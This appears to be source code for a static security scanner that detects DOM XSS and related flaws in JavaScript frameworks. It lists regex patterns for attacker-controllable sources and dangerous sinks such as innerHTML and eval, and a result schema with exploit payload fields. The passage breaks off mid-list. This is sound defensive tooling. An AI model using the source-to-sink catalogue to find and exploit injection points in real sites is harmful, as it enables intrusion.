/**
 * CleanTraffic - Advanced Security Scanner
 * Comprehensive vulnerability detection with Zod validation, enhanced context,
 * source/sink highlighting, and future-proof detection patterns.
 */

import * as fs from 'fs';
import * as path from 'path';
import { exec } from 'child_process';
import { promisify } from 'util';
import { z } from 'zod';
import { getRulesDir, shellEscapePath } from './paths';

/** Lazy-loaded Prettier - avoids MODULE_NOT_FOUND on macOS/packaged when paths differ */
let prettierModule: typeof import('prettier') | null = null;
let prettierTried = false;
function getPrettier(): typeof import('prettier') | null {
  if (prettierTried) return prettierModule;
  prettierTried = true;
  try {
    prettierModule = require('prettier');
    return prettierModule;
  } catch {
    prettierModule = null;
    return null;
  }
}

const execAsync = promisify(exec);

// ═══════════════════════════════════════════════════════════════════════════════════════════════
// ZOD VALIDATION SCHEMAS - Reduces false positives through strict validation
// ═══════════════════════════════════════════════════════════════════════════════════════════════

/** Valid severity levels */
const SeveritySchema = z.enum(['error', 'warning', 'info']);

/** Valid confidence levels */
const ConfidenceSchema = z.enum(['low', 'medium', 'high', 'very-high', 'unknown']);

/** Code highlight position - validated for coherence */
const CodeHighlightSchema = z.object({
  kind: z.enum(['source', 'sink', 'taint', 'metavar', 'vulnerable']),
  name: z.string().optional(),
  startLine: z.number().int().positive(),
  startCol: z.number().int().positive(),
  endLine: z.number().int().positive(),
  endCol: z.number().int().positive(),
}).refine(data => {
  // End must be after or equal to start
  if (data.endLine < data.startLine) return false;
  if (data.endLine === data.startLine && data.endCol < data.startCol) return false;
  return true;
}, { message: 'End position must be after start position' });

/** Taint trace entry - validated structure */
const TaintTraceSchema = z.object({
  type: z.enum(['source', 'propagation', 'sink']),
  line: z.number().int().positive(),
  column: z.number().int().positive().optional(),
  variable: z.string().optional(),
  expression: z.string().max(200).optional(),
  description: z.string().max(300),
});

/** Exploit information schema */
const ExploitInfoSchema = z.object({
  description: z.string().max(500).optional(),
  payloads: z.array(z.string().max(500)).max(10).optional(),
  tips: z.array(z.string().max(300)).max(5).optional(),
  curlExample: z.string().max(1000).optional(),
});

/** Main scan result schema - full validation */
const ScanResultSchema = z.object({
  ruleId: z.string().min(1).max(100),
  severity: SeveritySchema,
  message: z.string().min(1).max(800),
  line: z.number().int().min(0),
  column: z.number().int().min(0),
  file: z.string().min(1),
  
  // Pattern/Match info
  pattern: z.string().max(500).optional(),
  matchedCode: z.string().max(3000).optional(),
  matchedCodeHighlights: z.array(CodeHighlightSchema).optional(),
  
  // Context - 2500+ chars of coherent code when available
  contextCode: z.string().max(8000).optional(),
  contextStartLine: z.number().int().positive().optional(),
  contextEndLine: z.number().int().positive().optional(),
  
  // Classification
  category: z.string().max(50).optional(),
  cwe: z.string().regex(/^CWE-\d+$/).optional(),
  owasp: z.string().max(50).optional(),
  frameworks: z.array(z.string().max(50)).max(10).optional(),
  confidence: ConfidenceSchema.optional(),
  
  // Taint flow
  taintTrace: z.array(TaintTraceSchema).optional(),
  trace: z.array(z.string().max(300)).optional(),
  flowPath: z.string().max(200).optional(), // e.g. "L12 → L45 → L67" for quick manual review

  // Entry point info
  entryPoint: z.string().max(200).optional(),
  parameter: z.string().max(100).optional(),
  
  // Additional metadata
  impact: z.string().max(300).optional(),
  remediation: z.string().max(500).optional(),
  chainable: z.boolean().optional(),
  manualTest: z.array(z.string().max(200)).max(5).optional(),
  title: z.string().max(150).optional(),
  
  // Exploitability
  exploitability: z.number().int().min(0).max(10).optional(),
  exploitabilityReasons: z.array(z.string().max(100)).max(10).optional(),
  exploit: ExploitInfoSchema.optional(),
});

/** Type derived from schema */
export type ScanResult = z.infer<typeof ScanResultSchema>;

/** Taint trace entry type */
export type TaintTraceEntry = z.infer<typeof TaintTraceSchema>;

/** Code highlight type */
export type CodeHighlight = z.infer<typeof CodeHighlightSchema>;

// ═══════════════════════════════════════════════════════════════════════════════════════════════
// INTERNAL TYPES
// ═══════════════════════════════════════════════════════════════════════════════════════════════

interface SinkPattern {
  pattern: RegExp;
  name: string;
  severity?: 'error' | 'warning' | 'info';
  cwe?: string;
}

interface ContextWindow {
  text: string;
  startLine: number;
  endLine: number;
}

interface EvidenceWindow {
  text: string;
  highlights: CodeHighlight[];
  startLine: number;
  endLine: number;
}

interface TaintedVariable {
  name: string;
  sourceLine: number;
  sourceColumn: number;
  sourceExpression: string;
  sourceName: string;
  controllability: 'high' | 'medium' | 'low';
  propagationChain: Array<{ line: number; expression: string; transform?: string }>;
  sanitized: boolean;
  sanitizerLine?: number;
}

interface DetectionContext {
  code: string;
  lines: string[];
  lineOffsets: number[];
  url: string;
  taintedVars: Map<string, TaintedVariable>;
}

/** Semgrep JSON result item (check_id, start, end, extra, message). */
interface SemgrepResultItem {
  check_id?: string;
  start?: { line?: number; col?: number };
  end?: { line?: number; col?: number };
  extra?: {
    message?: string;
    severity?: string;
    metadata?: Record<string, unknown>;
    dataflow_trace?: {
      taint_source?: { location?: { start?: { line: number; col?: number } }; span?: { start?: { line: number; col?: number } }; start?: { line: number; col?: number } };
      taint_sink?: { location?: { start?: { line: number; col?: number } }; span?: { start?: { line: number; col?: number } }; start?: { line: number; col?: number } };
    };
  };
  message?: string;
}

// ═══════════════════════════════════════════════════════════════════════════════════════════════
// FALSE POSITIVE VALIDATORS - Zod-based validation to filter non-sense
// ═══════════════════════════════════════════════════════════════════════════════════════════════

/** Validates that a detection is not a false positive */
const FalsePositiveFilterSchema = z.object({
  // Must have actual line number
  line: z.number().int().positive('Detection must have positive line number'),
  
  // Must have matched code that looks like actual code
  matchedCode: z.string()
    .min(5, 'Matched code too short')
    .max(3000, 'Matched code too long')
    .refine(code => {
      // Must contain actual code characters, not just whitespace/comments
      const stripped = code.replace(/\/\/.*|\/\*[\s\S]*?\*\/|\s+/g, '');
      return stripped.length >= 3;
    }, 'Matched code must contain actual code')
    .optional(),
    
  // Message must be meaningful
  message: z.string()
    .min(10, 'Message too short')
    .max(800, 'Message too long'),
    
  // Context must be coherent (2500+ chars when available)
  contextCode: z.string()
    .refine(ctx => {
      if (!ctx) return true;
      // Must have reasonable structure (not all on one line unless short)
      const lines = ctx.split('\n');
      if (ctx.length > 500 && lines.length < 3) return false;
      return true;
    }, 'Context code must be coherent multi-line code')
    .optional(),
});

/** Validates taint flow is coherent */
const TaintFlowValidator = z.object({
  sourceLine: z.number().int().positive(),
  sinkLine: z.number().int().positive(),
  sourceExpression: z.string().min(1),
  sinkExpression: z.string().min(1),
}).refine(data => {
  // Source should come before or at sink (in reasonable range)
  const distance = Math.abs(data.sinkLine - data.sourceLine);
  return distance < 1000; // Reasonable distance
}, 'Taint source and sink too far apart');

// ═══════════════════════════════════════════════════════════════════════════════════════════════
// SCANNER CLASS
// ═══════════════════════════════════════════════════════════════════════════════════════════════

export class Scanner {
  private rulesDir: string;
  private semgrepRules: string;
  private semgrepResolvedCmd?: string | null;
  private semgrepWarnedMissing = false;
  private warnedLargeScan = false;
  
  /** Minimum context chars to return (coherent code window) - 2500+ for better triage */
  private static readonly MIN_CONTEXT_CHARS = 2500;
  
  /** Maximum context chars */
  private static readonly MAX_CONTEXT_CHARS = 6000;
  
  /** Context lines for detection window */
  private static readonly CONTEXT_LINES = 80;
  
  /** Noise patterns that should never trigger findings */
  private static readonly FALSE_POSITIVE_PATTERNS: RegExp[] = [
    /^\s*\/\/.*$/, // Comment-only lines
    /^\s*\/\*.*\*\/\s*$/, // Single-line block comments
    /^\s*\*.*$/, // JSDoc lines
    /['"`]use strict['"`]/, // Use strict
    /^\s*import\s+.*from\s+['"]/, // Static imports
    /^\s*export\s+(default\s+)?(?:const|let|var|function|class)\s+\w+/, // Export declarations
    /\.(?:test|spec|mock|stub)\.(js|ts|jsx|tsx)$/, // Test files
    /\/node_modules\//, // Node modules
    /^\s*console\.(log|warn|error|info|debug)\s*\(/, // Console statements
    // Type-only / declaration noise
    /^\s*declare\s+(const|let|var|function|class|interface|type)\s+/i,
    /^\s*interface\s+\w+\s*\{/, // Interface declaration only
    /^\s*type\s+\w+\s*=\s*/, // Type alias only
    /@(?:example|see|description)\s*[\s\S]*?(?=\n\s*@|\n\s*\*\/)/i,
    /(?:TODO|FIXME|XXX|HACK)\s*:?\s*[^\n]*/i,
    /(?:example|sample|placeholder|dummy|fake)\s*[:\s]*['"`][^'"`]{0,50}['"`]/i,
    /\/\*\s*eslint|\/\/\s*@ts-ignore|\/\/\s*@ts-expect-error/i,
  ];
  
  /** Common safe patterns that reduce severity when present in context */
  private static readonly SAFE_CONTEXT_PATTERNS: RegExp[] = [
    /\.textContent\s*=/, // Safe DOM assignment
    /\.innerText\s*=/, // Safe DOM assignment
    /createTextNode\s*\(/, // Safe text node creation
    /encodeURIComponent\s*\(/, // URL encoding
    /encodeURI\s*\(/, // URL encoding
    // Note: .replace with user input as 2nd arg is XSS (CVE-2025-27108) - do NOT treat as safe
    /\.trim\s*\(\s*\)/, // String trimming
    /parseInt\s*\(|parseFloat\s*\(/, // Number parsing
    /Number\s*\(|String\s*\(|Boolean\s*\(/, // Type coercion
    // Additional sanitization / validation
    /DOMPurify\.sanitize\s*\(|sanitizeHtml\s*\(|xss\s*\(|\.sanitize\s*\(/i,
    /he\.encode\s*\(|escapeHtml\s*\(|_.escape\s*\(/i,
    /new\s+URL\s*\([^)]+\)\.(?:origin|protocol|hostname)/, // URL parsing for validation
    /(?:allowlist|whitelist|validOrigins?|allowedOrigins?)\.(?:includes?|indexOf|has)\s*\(/i,
    /(?:prepareStatement|parameterized|placeholder|\?\s*\)|:\w+\s*\))/i, // Parameterized queries
    /path\.(?:join|resolve|normalize)\s*\([^)]*,\s*['"]/, // Path with literal base
    /Content-Security-Policy|CSP|nonce=|integrity=/i, // CSP / SRI
    /(?:sanitize|escape|encode|validate)(?:For)?(?:Html|Url|Sql|Xss)?\s*\(/i,
    /\.replace\s*\(\s*\/[^/]+\/[gim]*\s*,\s*['"][^'"`]*['"]\s*\)/, // Regex replace with literal string only
  ];

  // ─────────────────────────────────────────────────────────────────────────────────────────────
  // DOM XSS SOURCES - Comprehensive attacker-controllable inputs (2025/2026)
  // Categorized by controllability level for better classification
  // ─────────────────────────────────────────────────────────────────────────────────────────────

  /** HIGH controllability - Directly controllable via URL/navigation */
  static DOM_SOURCES_HIGH: Array<{ pattern: RegExp; name: string; controllability: 'high' }> = [
    // Location API - Full URL control
    { pattern: /(?:window\.)?location\.search\b/, name: 'location.search', controllability: 'high' },
    { pattern: /(?:window\.)?location\.hash\b/, name: 'location.hash', controllability: 'high' },
    { pattern: /(?:window\.)?location\.href\b/, name: 'location.href', controllability: 'high' },
    { pattern: /(?:window\.)?location\.pathname\b/, name: 'location.pathname', controllability: 'high' },
    { pattern: /\bdocument\.URL\b/, name: 'document.URL', controllability: 'high' },
    { pattern: /\bdocument\.documentURI\b/, name: 'document.documentURI', controllability: 'high' },
    { pattern: /\bdocument\.baseURI\b/, name: 'document.baseURI', controllability: 'high' },
    
    // URLSearchParams - Query parameter extraction
    { pattern: /\bURLSearchParams\s*\([^)]*\)\.get\s*\(/, name: 'URLSearchParams.get()', controllability: 'high' },
    { pattern: /\bURLSearchParams\s*\([^)]*\)\.getAll\s*\(/, name: 'URLSearchParams.getAll()', controllability: 'high' },
    { pattern: /\.searchParams\.get\s*\(/, name: 'url.searchParams.get()', controllability: 'high' },
    { pattern: /\.searchParams\.getAll\s*\(/, name: 'url.searchParams.getAll()', controllability: 'high' },
    { pattern: /\bget(?:Query)?Param(?:eter)?(?:ByName)?\s*\(/i, name: 'getQueryParam()', controllability: 'high' },
    
    // URL decoding of location data
    { pattern: /\bdecodeURIComponent\s*\(\s*(?:location|window\.location)/, name: 'decodeURIComponent(location)', controllability: 'high' },
    { pattern: /\bdecodeURI\s*\(\s*(?:location|window\.location)/, name: 'decodeURI(location)', controllability: 'high' },
    { pattern: /\bunescape\s*\(\s*(?:location|window\.location)/, name: 'unescape(location)', controllability: 'high' },
    
    // window.name - Persists across navigations (powerful XSS vector)
    // Note: Do NOT add bare "name" as source here - it causes massive FPs (object.name, param name, etc.).
    // Implicit window.name is handled only in scanWindowNameAbuse when used in dangerous sinks.
    { pattern: /\bwindow\.name\b/, name: 'window.name', controllability: 'high' },

    // document.referrer - Controllable via navigation
    { pattern: /\bdocument\.referrer\b/, name: 'document.referrer', controllability: 'high' },

    // window.opener / window.parent - Controllable via target=_blank, iframe navigation (2025)
    { pattern: /\bwindow\.opener\b/, name: 'window.opener', controllability: 'high' },
    { pattern: /\bwindow\.parent\b/, name: 'window.parent', controllability: 'high' },
    { pattern: /\bwindow\.top\b/, name: 'window.top', controllability: 'high' },
    { pattern: /\bwindow\.frames\b/, name: 'window.frames', controllability: 'high' },

    // Obfuscated / bracket notation - same controllability as dot form
    { pattern: /(?:window|location)\s*\[\s*['"]location['"]\s*\]\s*\[\s*['"](?:search|hash|href|pathname)['"]\s*\]/, name: 'location[search/hash] (obfuscated)', controllability: 'high' },
    { pattern: /(?:window\.)?location\s*\[\s*['"](?:search|hash|href|pathname)['"]\s*\]/, name: 'location["search"] (obfuscated)', controllability: 'high' },
    { pattern: /\.searchParams\s*\[\s*['"]get['"]\s*\]\s*\(|\.searchParams\.get\s*\(\s*[^'"\s)]+\s*\)/, name: 'searchParams.get(param)', controllability: 'high' },
    { pattern: /\bURLSearchParams\s*\([^)]+\)\s*\[\s*['"]get['"]\s*\]\s*\(/, name: 'URLSearchParams["get"]()', controllability: 'high' },
  ];

  /** MEDIUM controllability - Requires user interaction or specific context */
  static DOM_SOURCES_MEDIUM: Array<{ pattern: RegExp; name: string; controllability: 'medium' }> = [
    // PostMessage - Cross-origin messaging (requires victim to be on attacker page)
    { pattern: /\bevent\.data\b/, name: 'event.data (postMessage)', controllability: 'medium' },
    { pattern: /\be\.data\b/, name: 'e.data (postMessage)', controllability: 'medium' },
    { pattern: /\bmessageEvent\.data\b/, name: 'messageEvent.data', controllability: 'medium' },
    { pattern: /(?:event|e|msg)\.data\s*\.\s*\w+/, name: 'event.data.property (postMessage)', controllability: 'medium' },
    { pattern: /window\.addEventListener\s*\(\s*['"]message['"]/, name: 'message event listener', controllability: 'medium' },
    { pattern: /window\.onmessage\s*=/, name: 'window.onmessage', controllability: 'medium' },
    
    // Storage APIs - Requires prior injection into storage
    { pattern: /(?:localStorage|sessionStorage)\.getItem\s*\(/, name: 'storage.getItem()', controllability: 'medium' },
    { pattern: /(?:localStorage|sessionStorage)\s*\[\s*['"]/, name: 'storage["key"]', controllability: 'medium' },
    
    // Cookies - Requires cookie injection or CRLF
    { pattern: /\bdocument\.cookie\b/, name: 'document.cookie', controllability: 'medium' },
    
    // History state - Requires pushState/replaceState control
    { pattern: /\bhistory\.state\b/, name: 'history.state', controllability: 'medium' },
    
    // Form/Input values - Requires form prefill or user input
    { pattern: /\bevent\.target\.value\b/, name: 'event.target.value', controllability: 'medium' },
    { pattern: /\.value\b(?!\s*=)/, name: 'element.value', controllability: 'medium' },
    { pattern: /\bformData\.get\s*\(/i, name: 'formData.get()', controllability: 'medium' },
    
    // WebSocket message data
    { pattern: /\.onmessage\s*=.*(?:event|e|msg)\.data/, name: 'WebSocket onmessage', controllability: 'medium' },

    // DOM data attributes (getAttribute('data-*') - controllable via markup)
    { pattern: /\.getAttribute\s*\(\s*['"]data-[a-zA-Z0-9-]+['"]\s*\)/i, name: 'getAttribute(data-*)', controllability: 'medium' },
    { pattern: /\.dataset\.\w+/, name: 'element.dataset', controllability: 'medium' },

    // Fetch / Request API - URL and body from user
    { pattern: /\b(?:fetch|request)\s*\(\s*[^)]*\.(?:url|href|search)\b/, name: 'fetch(request.url)', controllability: 'medium' },
    { pattern: /new\s+Request\s*\([^)]*\)/, name: 'new Request()', controllability: 'medium' },
    { pattern: /new\s+URL\s*\([^)]+\)\.searchParams/, name: 'URL.searchParams', controllability: 'medium' },

    // Fetch response body → callback (response.json() / .text() often flows to DOM)
    { pattern: /(?:response|res|r)\.(?:json|text)\s*\(\s*\)/, name: 'response.json()/text()', controllability: 'medium' },
    { pattern: /await\s+.*\.(?:json|text)\s*\(\s*\)/, name: 'await response.json()', controllability: 'medium' },

    // Web Worker - message data
    { pattern: /\bself\.onmessage\s*=|addEventListener\s*\(\s*['"]message['"]\s*,/, name: 'Worker onmessage', controllability: 'medium' },

    // Server-Sent Events (SSE) - controllable via EventSource URL (2025)
    { pattern: /\bEventSource\s*\([^)]+\)/, name: 'EventSource (SSE)', controllability: 'medium' },
    { pattern: /\.onmessage\s*=.*(?:event|e)\.data/, name: 'SSE onmessage', controllability: 'medium' },
  ];

  /** LOW controllability - Limited attack surface */
  static DOM_SOURCES_LOW: Array<{ pattern: RegExp; name: string; controllability: 'low' }> = [
    // Clipboard - Requires user to paste
    { pattern: /\bevent\.clipboardData\.getData\s*\(/, name: 'clipboardData.getData()', controllability: 'low' },
    { pattern: /\bnavigator\.clipboard\.readText\s*\(/, name: 'navigator.clipboard.readText()', controllability: 'low' },
    
    // Drag & Drop - Requires user to drag from attacker context
    { pattern: /\bevent\.dataTransfer\.getData\s*\(/, name: 'dataTransfer.getData()', controllability: 'low' },
    
    // File API - Requires user to select file
    { pattern: /\bevent\.target\.files\b/, name: 'event.target.files', controllability: 'low' },
    { pattern: /\bFileReader\b.*\.result\b/, name: 'FileReader.result', controllability: 'low' },
    
    // IndexedDB - Requires prior database poisoning
    { pattern: /\bindexedDB\.open\s*\(/, name: 'indexedDB.open()', controllability: 'low' },
  ];

  /** Framework-specific sources - Props/params that often contain user input */
  static FRAMEWORK_SOURCES: Array<{ pattern: RegExp; name: string; controllability: 'high' | 'medium'; framework: string }> = [
    // Next.js - Route params and query from SSR/SSG
    { pattern: /(?:params|query)\s*[=:]\s*(?:context|ctx)\.(?:params|query)/, name: 'Next.js route params', controllability: 'high', framework: 'next' },
    { pattern: /useSearchParams\s*\(\s*\)/, name: 'Next.js useSearchParams', controllability: 'high', framework: 'next' },
    { pattern: /useParams\s*\(\s*\)/, name: 'Next.js useParams', controllability: 'high', framework: 'next' },
    { pattern: /searchParams\.get\s*\(/, name: 'Next.js searchParams.get()', controllability: 'high', framework: 'next' },
    
    // React Router - Route params
    { pattern: /useParams\s*\(\s*\)/, name: 'React Router useParams', controllability: 'high', framework: 'react-router' },
    { pattern: /useSearchParams\s*\(\s*\)/, name: 'React Router useSearchParams', controllability: 'high', framework: 'react-router' },
    { pattern: /match\.params\./, name: 'React Router match.params', controllability: 'high', framework: 'react-router' },
    
    // Vue Router - Route params
    { pattern: /\$route\.params\./, name: 'Vue $route.params', controllability: 'high', framework: 'vue-router' },
    { pattern: /\$route\.query\./, name: 'Vue $route.query', controllability: 'high', framework: 'vue-router' },
    { pattern: /useRoute\s*\(\s*\)\.params/, name: 'Vue useRoute().params', controllability: 'high', framework: 'vue-router' },
    { pattern: /useRoute\s*\(\s*\)\.query/, name: 'Vue useRoute().query', controllability: 'high', framework: 'vue-router' },
    
    // Nuxt - Route and async data
    { pattern: /useRoute\s*\(\s*\)/, name: 'Nuxt useRoute', controllability: 'high', framework: 'nuxt' },
    { pattern: /useFetch\s*\([^)]*\$route/, name: 'Nuxt useFetch with route', controllability: 'medium', framework: 'nuxt' },
    
    // SvelteKit - Page params and URL
    { pattern: /\$page\.params\./, name: 'SvelteKit $page.params', controllability: 'high', framework: 'sveltekit' },
    { pattern: /\$page\.url\.searchParams/, name: 'SvelteKit $page.url.searchParams', controllability: 'high', framework: 'sveltekit' },
    { pattern: /data\.(?:params|url)/, name: 'SvelteKit load data', controllability: 'high', framework: 'sveltekit' },
    
    // Angular - Route params
    { pattern: /ActivatedRoute.*\.params/, name: 'Angular route params', controllability: 'high', framework: 'angular' },
    { pattern: /ActivatedRoute.*\.queryParams/, name: 'Angular queryParams', controllability: 'high', framework: 'angular' },
    { pattern: /this\.route\.snapshot\.params/, name: 'Angular snapshot params', controllability: 'high', framework: 'angular' },
    
    // Express/Node - Request inputs (for SSR)
    { pattern: /req\.query\./, name: 'Express req.query', controllability: 'high', framework: 'express' },
    { pattern: /req\.params\./, name: 'Express req.params', controllability: 'high', framework: 'express' },
    { pattern: /req\.body\./, name: 'Express req.body', controllability: 'high', framework: 'express' },
  ];

  /** Combined sources for backward compatibility */
  static DOM_XSS_SOURCES: RegExp[] = [
    ...Scanner.DOM_SOURCES_HIGH.map(s => s.pattern),
    ...Scanner.DOM_SOURCES_MEDIUM.map(s => s.pattern),
    ...Scanner.DOM_SOURCES_LOW.map(s => s.pattern),
    ...Scanner.FRAMEWORK_SOURCES.map(s => s.pattern),
  ];

  // ─────────────────────────────────────────────────────────────────────────────────────────────
  // DOM SINKS - Categorized by vulnerability type for proper classification
  // Based on PortSwigger, HackTricks, and OWASP DOM XSS research (2024-2026)
  // ─────────────────────────────────────────────────────────────────────────────────────────────

  /** HTML Injection Sinks - Core sinks (taint tracking determines if vulnerable) */
  static SINKS_HTML_INJECTION: SinkPattern[] = [
    // Native DOM - only flag when right-hand side is not a string literal
    { pattern: /\.innerHTML\s*=\s*(?!['"`])/, name: 'innerHTML', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\.outerHTML\s*=\s*(?!['"`])/, name: 'outerHTML', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\.insertAdjacentHTML\s*\([^,]+,\s*(?!['"`])/, name: 'insertAdjacentHTML', cwe: 'CWE-79', severity: 'error' },
    { pattern: /document\.write(?:ln)?\s*\(\s*(?!['"`])/, name: 'document.write', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\.srcdoc\s*=\s*(?!['"`])/, name: 'iframe.srcdoc', cwe: 'CWE-79', severity: 'error' },
    { pattern: /createContextualFragment\s*\(\s*(?!['"`])/, name: 'createContextualFragment', cwe: 'CWE-79', severity: 'error' },
    
    // React/Next.js - __html with dynamic value
    { pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{/, name: 'React dangerouslySetInnerHTML', cwe: 'CWE-79', severity: 'error' },
    { pattern: /__html\s*:\s*(?!['"`])/, name: 'React __html', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\.current\.innerHTML\s*=\s*(?!['"`])/, name: 'React ref.innerHTML', cwe: 'CWE-79', severity: 'error' },
    
    // Vue 2/3 - v-html directive
    { pattern: /v-html\s*=\s*["']/, name: 'Vue v-html', cwe: 'CWE-79', severity: 'warning' },
    { pattern: /\$refs\[\s*['"][^'"]+['"]\s*\]\.innerHTML\s*=/, name: 'Vue $refs.innerHTML', cwe: 'CWE-79', severity: 'error' },
    
    // Angular - bypass security and innerHTML binding
    { pattern: /\[innerHTML\]\s*=\s*["']/, name: 'Angular [innerHTML]', cwe: 'CWE-79', severity: 'warning' },
    { pattern: /bypassSecurityTrustHtml\s*\(/, name: 'Angular bypassSecurityTrustHtml', cwe: 'CWE-79', severity: 'error' },
    { pattern: /bypassSecurityTrustScript\s*\(/, name: 'Angular bypassSecurityTrustScript', cwe: 'CWE-79', severity: 'error' },
    
    // Svelte - {@html} directive (always dangerous with user input)
    { pattern: /\{@html\s+\w/, name: 'Svelte {@html}', cwe: 'CWE-79', severity: 'error' },
    
    // SolidJS - innerHTML prop
    { pattern: /innerHTML=\{(?!['"`])/, name: 'SolidJS innerHTML', cwe: 'CWE-79', severity: 'error' },
    
    // Astro - set:html directive
    { pattern: /set:html=\{/, name: 'Astro set:html', cwe: 'CWE-79', severity: 'error' },
    
    // Lit - unsafeHTML directive
    { pattern: /unsafeHTML\s*\(\s*(?!['"`])/, name: 'Lit unsafeHTML', cwe: 'CWE-79', severity: 'error' },
    
    // Alpine.js - x-html directive
    { pattern: /x-html\s*=\s*["']\s*\w/, name: 'Alpine x-html', cwe: 'CWE-79', severity: 'warning' },
    
    // jQuery - html() with dynamic content
    { pattern: /\.html\s*\(\s*(?!['"`]\s*\))/, name: 'jQuery.html()', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\$\.parseHTML\s*\(\s*(?!['"`])/, name: 'jQuery.parseHTML()', cwe: 'CWE-79', severity: 'error' },

    // Obfuscated / bracket notation sinks
    { pattern: /\[\s*['"]innerHTML['"]\s*\]\s*=\s*(?!['"`])/, name: '["innerHTML"]', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\[\s*['"]outerHTML['"]\s*\]\s*=\s*(?!['"`])/, name: '["outerHTML"]', cwe: 'CWE-79', severity: 'error' },

    // CSSOM XSS sinks (2025-2026) - style injection can lead to expression/behavior XSS
    { pattern: /\.style\.cssText\s*=\s*(?!['"`])/, name: 'element.style.cssText', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\.style\s*\[\s*['"]\w+['"]\s*\]\s*=\s*(?!['"`])/, name: 'element.style[prop]', cwe: 'CWE-79', severity: 'warning' },
    { pattern: /insertRule\s*\(\s*(?!['"`])/, name: 'CSSStyleSheet.insertRule', cwe: 'CWE-79', severity: 'error' },
    { pattern: /addRule\s*\(\s*(?!['"`])/, name: 'CSSStyleSheet.addRule', cwe: 'CWE-79', severity: 'warning' },
  ];

  /** String.replace XSS - CVE-2025-27108: $` $' $& in replacement string execute (2025) */
  static SINKS_REPLACE_XSS: SinkPattern[] = [
    { pattern: /\.replace\s*\(\s*[^,)]+,\s*(?!['"`]\s*\))(?!\s*function\s*\()/, name: 'String.replace(replacement)', cwe: 'CWE-79', severity: 'error' },
    { pattern: /\.replaceAll\s*\(\s*[^,)]+,\s*(?!['"`]\s*\))(?!\s*function\s*\()/, name: 'String.replaceAll(replacement)', cwe: 'CWE-79', severity: 'error' },
  ];

  /** JavaScript Injection Sinks - Lead to code execution */
  static SINKS_JS_EXECUTION: SinkPattern[] = [
    { pattern: /\beval\s*\(/, name: 'eval()', cwe: 'CWE-94', severity: 'error' },
    { pattern: /(?:window|globalThis)\s*\[\s*['"]eval['"]\s*\]\s*\(/, name: 'window["eval"]()', cwe: 'CWE-94', severity: 'error' },
    { pattern: /(?:document|window)\s*\[\s*['"]write['"]\s*\]\s*\(/, name: 'document["write"]()', cwe: 'CWE-79', severity: 'error' },
    { pattern: /new\s+Function\s*\(/, name: 'Function constructor', cwe: 'CWE-94', severity: 'error' },
    { pattern: /setTimeout\s*\(\s*[^,]*[^'"]\s*,/, name: 'setTimeout(string)', cwe: 'CWE-94', severity: 'error' },
    { pattern: /setInterval\s*\(\s*[^,]*[^'"]\s*,/, name: 'setInterval(string)', cwe: 'CWE-94', severity: 'error' },
    { pattern: /setImmediate\s*\(\s*[^'"]\s*\)/, name: 'setImmediate(string)', cwe: 'CWE-94', severity: 'error' },
    { pattern: /execScript\s*\(/, name: 'execScript()', cwe: 'CWE-94', severity: 'error' },
    { pattern: /\.globalEval\s*\(/, name: 'jQuery.globalEval()', cwe: 'CWE-94', severity: 'error' },
    // Script element manipulation
    { pattern: /scriptElement\.src\s*=/, name: 'script.src', cwe: 'CWE-94', severity: 'error' },
    { pattern: /scriptElement\.text\s*=/, name: 'script.text', cwe: 'CWE-94', severity: 'error' },
    { pattern: /\.src\s*=.*\.js/, name: 'dynamic script src', cwe: 'CWE-94', severity: 'warning' },
    // Dynamic import() — user-controlled module path leads to code load
    { pattern: /\bimport\s*\(\s*[^'")\s]/, name: 'import(dynamic)', cwe: 'CWE-94', severity: 'error' },
    { pattern: /\bimport\s*\(\s*`[^`]*\$\{/, name: 'import(template literal)', cwe: 'CWE-94', severity: 'error' },
  ];

  /** Open Redirect Sinks */
  static SINKS_OPEN_REDIRECT: SinkPattern[] = [
    { pattern: /location\s*=\s*[^'"=]/, name: 'location assignment', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /location\.href\s*=\s*[^'"=]/, name: 'location.href', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /location\.assign\s*\(/, name: 'location.assign()', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /location\.replace\s*\(/, name: 'location.replace()', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /window\.open\s*\(/, name: 'window.open()', cwe: 'CWE-601', severity: 'warning' },
  ];

  /** Link/Resource Manipulation Sinks */
  static SINKS_LINK_MANIPULATION: SinkPattern[] = [
    { pattern: /\.href\s*=\s*[^'"=]/, name: 'element.href', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /\.src\s*=\s*[^'"=]/, name: 'element.src', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /\.action\s*=\s*[^'"=]/, name: 'form.action', cwe: 'CWE-601', severity: 'warning' },
    { pattern: /setAttribute\s*\(\s*['"](?:href|src|action|formaction|data|poster|background)['"]/, name: 'setAttribute(url-attr)', cwe: 'CWE-601', severity: 'warning' },
  ];

  /** AJAX/Fetch Sinks - Lead to SSRF */
  static SINKS_AJAX: SinkPattern[] = [
    { pattern: /\bfetch\s*\(\s*[^'"]/, name: 'fetch(dynamic)', cwe: 'CWE-918', severity: 'warning' },
    { pattern: /XMLHttpRequest.*\.open\s*\([^,]+,\s*[^'"]/, name: 'XHR.open(dynamic)', cwe: 'CWE-918', severity: 'warning' },
    { pattern: /XMLHttpRequest.*\.send\s*\(/, name: 'XHR.send()', cwe: 'CWE-918', severity: 'info' },
    { pattern: /\baxios\s*\(\s*[^'"]/, name: 'axios(dynamic)', cwe: 'CWE-918', severity: 'warning' },
    { pattern: /\baxios\.(?:get|post|put|delete|patch)\s*\(\s*[^'"]/, name: 'axios.method(dynamic)', cwe: 'CWE-918', severity: 'warning' },
    { pattern: /\$\.ajax\s*\(/, name: 'jQuery.ajax()', cwe: 'CWE-918', severity: 'info' },
    { pattern: /\$\.(?:get|post)\s*\(\s*[^'"]/, name: 'jQuery.get/post(dynamic)', cwe: 'CWE-918', severity: 'warning' },
  ];

  /** WebSocket Sinks */
  static SINKS_WEBSOCKET: SinkPattern[] = [
    { pattern: /new\s+WebSocket\s*\(\s*[^'"]/, name: 'WebSocket(dynamic)', cwe: 'CWE-918', severity: 'warning' },
